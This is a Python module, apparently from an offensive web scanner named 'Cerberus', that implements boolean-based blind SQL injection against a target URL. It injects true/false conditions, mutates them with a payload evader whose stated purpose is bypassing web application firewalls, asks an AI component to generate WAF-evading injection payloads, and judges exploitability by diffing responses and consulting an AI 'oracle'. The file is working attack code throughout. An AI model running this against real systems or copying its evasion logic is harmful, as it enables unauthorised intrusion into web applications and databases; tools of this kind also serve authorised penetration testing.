import asyncio
import logging
import difflib
from typing import Dict, Any
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_boolean")

class VectorBoolean(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en inferencia Booleana.
    Inyecta condiciones True/False mutadas e inferidas para evadir WAF.
    """
    
    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Boolean sobre {self.target_url}")
        
        # Instanciar el evasor dinámico (Agresividad 3 por defecto para WAFs modernos)
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # Payloads booleanos base o generados por IA
        base_true = " AND 1=1"
        base_false = " AND 1=2"
        
        # Integrate AI Smart Payloads if omni context allows
        if context.get("force_ai_payloads", True):
            try:
                from backend.core.cortex_ai import generate_smart_payloads
                logger.debug(f"[Boolean] Invocando Cortex AI (WAF: {context.get('waf_type', 'Auto')}) para generar paquete de ataques lógicos avanzados...")
                ai_ctx = {
                    "vector": "Boolean", 
                    "url": self.target_url, 
                    "parameter": "id",
                    "waf_type": context.get("waf_type", "general_strong")
                }
                # Request 2 payloads: first should evaluate to true, second to false ideally, or just varied syntax
                smart_p = await generate_smart_payloads(ai_ctx, "Generar inyecciones Boolean-Blind evadiendo WAF. 1 payload true, 1 false.", target_count=2)
                if smart_p and len(smart_p) >= 2:
                    base_true = smart_p[0]
                    base_false = smart_p[1]
                    logger.info(f"[*] Native Engine (AI): Paquete de ataques lógicos aplicado. True={base_true[:15]}..., False={base_false[:15]}...")
            except Exception as e:
                logger.warning(f"[Boolean] Paquete de ataques IA falló, usando heurística local. Error: {e}")

        # Mutar los payloads con el evasor
        payload_true = evader.evade(base_true)
        payload_false = evader.evade(base_false)
        
        # 1. Petición Baseline
        base_resp = await self._safe_get(self.target_url)
        if not base_resp:
            return {"status": "failed", "reason": "baseline_unreachable"}
            
        # 2. Petición True
        url_true = self.inject_url(payload_true)
        resp_true = await self._safe_get(url_true)
        
        # 3. Petición False
        url_false = self.inject_url(payload_false)
        resp_false = await self._safe_get(url_false)
        
        if not resp_true or not resp_false:
            return {"status": "failed", "reason": "blocked_or_timeout"}

        # Análisis Matemático Heurístico Rápido (difflib) - Offloaded to thread to prevent loop blocking
        ratio_true_base = await asyncio.to_thread(
            lambda: difflib.SequenceMatcher(None, base_resp.text, resp_true.text).ratio()
        )
        ratio_false_base = await asyncio.to_thread(
            lambda: difflib.SequenceMatcher(None, base_resp.text, resp_false.text).ratio()
        )
        
        logger.debug(f"[Boolean] Ratio True: {ratio_true_base:.2f}, False: {ratio_false_base:.2f}")

        # Escenario Ideal (Heurística obvia)
        # Si el query TRUE es idéntico a la base, y el FALSE difiere significativamente
        if ratio_true_base > 0.95 and ratio_false_base < 0.90:
            logger.info("[+] Inyección Booleana Exitosa (Matemática Pura): Comportamiento Diferencial Confirmado")
            return {
                "status": "vulnerable", 
                "technique": "Boolean-based blind",
                "evidence": f"True payload matched baseline ({ratio_true_base:.2f}), False payload deviated ({ratio_false_base:.2f})"
            }

        # ── Cortex AI: El Oráculo Híbrido (Zona Gris) ──────────────────────
        # Si la respuesta no es predecible, pero el FALSE cambió notablemente, es Zona Gris.
        # Fallback a Semántica de IA (Evita FP/FN en sitios dinámicos o tras proxies)
        if ratio_false_base < 0.95:
            # Guard: if BOTH injected responses returned different HTTP status (e.g. 404),
            # it's a path-not-found, not an injection differential. Skip AI Oracle.
            if (resp_true.status_code != base_resp.status_code or
                    resp_false.status_code != base_resp.status_code):
                logger.debug("[Boolean] HTTP status mismatch (likely path injection). Skipping AI Oracle.")
                return {"status": "not_vulnerable"}
            logger.info("[?] Diferencial Crítico (Zona Gris). Invocando a Cortex AI (Oráculo)...")
            from backend.core.cortex_ai import analyze_injection_response
            ai_verdict = await analyze_injection_response(
                baseline_content=base_resp.text,
                true_content=resp_true.text,
                false_content=resp_false.text,
                vector_type="Boolean-based blind"
            )
            
            logger.info(f"🧠 [Oráculo AI] Veredicto: {ai_verdict['status']}. Confianza: {ai_verdict['confidence']*100}%")
            logger.debug(f"🧠 [Oráculo AI] Razonamiento: {ai_verdict['reasoning']}")
            
            if ai_verdict['status'] == 'vulnerable' and ai_verdict['confidence'] > 0.70:
                return {
                    "status": "vulnerable",
                    "technique": "Boolean-based blind (AI Analyzed)",
                    "evidence": ai_verdict['reasoning']
                }
            elif ai_verdict['status'] == 'blocked_by_waf':
                return {
                    "status": "failed",
                    "reason": "blocked_by_waf",
                    "evidence": ai_verdict['reasoning']
                }
        # ───────────────────────────────────────────────────────────────────
            
        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url)
        except Exception as e:
            logger.warning(f"Error HTTP en vector booleano: {e}")
            return None
